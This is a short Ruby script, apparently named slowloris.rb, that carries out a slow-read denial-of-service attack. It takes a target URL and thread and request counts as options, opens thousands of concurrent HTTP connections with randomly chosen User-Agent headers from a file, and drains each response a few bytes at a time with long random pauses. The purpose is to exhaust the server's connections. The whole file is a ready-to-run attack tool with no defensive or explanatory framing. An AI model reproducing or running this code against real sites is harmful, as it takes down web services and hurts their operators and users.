require 'net/http'
require 'optparse'
require 'thread/pool'

# slowly reads response from web-server

class Net::HTTPResponse
  attr_reader :socket
end

options = { port: 80, poolsize: 5000, requests: 10000, threads: 5000 }
OptionParser.new do |opts|
  opts.banner = "Usage: slowloris.rb [options]"

  opts.on('-u', '--url URL', 'site url') { |v| options[:url] = v }
  opts.on('-r', '--requests COUNT', 'requests count(default to 10000)') { |v| options[:requests] = v }
  opts.on('-t', '--threads THREADS', 'threads count(default to 5000)') { |v| options[:threads] = v }
end.parse!

agents = File.readlines('agents.txt')
pool = Thread.pool(options[:threads].to_i)

options[:requests].to_i.times do
  uri = URI(options[:url])
  pool.process do
    Net::HTTP.start(uri.host, uri.port) do |http|
      request = Net::HTTP::Get.new uri, { 'User-Agent' => agents.sample }

      http.request(request) do |response|
        begin
          loop do
            res = response.socket.read(rand(5..50))
            puts res
            sleep rand(5..30)
          end
        rescue => ex
          puts ex.message
        ensure
          http.finish
        end
        # be sure to call finish before exiting the block
      end
    end
  end
end
pool.shutdown
